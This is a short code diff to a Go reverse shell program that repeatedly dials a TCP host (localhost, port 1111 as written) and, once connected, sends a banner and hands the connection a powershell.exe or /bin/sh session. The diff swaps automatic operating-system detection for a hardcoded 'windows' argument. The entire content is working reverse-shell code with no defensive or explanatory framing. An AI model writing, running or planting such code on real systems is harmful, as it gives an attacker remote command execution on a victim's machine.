@@ -3,7 +3,6 @@ package main
 import (
 	"net"
 	"os/exec"
-	"runtime"
 	"strconv"
 	"time"
 )
@@ -18,17 +17,17 @@ const banner string = `
 `
 
 func main() {
-	reverseShell("localhost", 1111)
+	reverseShell("localhost", 1111, "windows")
 }
 
-func reverseShell(host string, port int) {
+func reverseShell(host string, port int, os string) {
 	for {
 		connexion, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
 		if err != nil {
 			time.Sleep(2 * time.Second)
 		} else {
 			connexion.Write([]byte(banner + "[+] Connected to " + connexion.LocalAddr().String() + "\n"))
-			if runtime.GOOS == "windows" {
+			if os == "windows" {
 				spawnShell(connexion, "powershell.exe")
 			} else {
 				spawnShell(connexion, "/bin/sh")
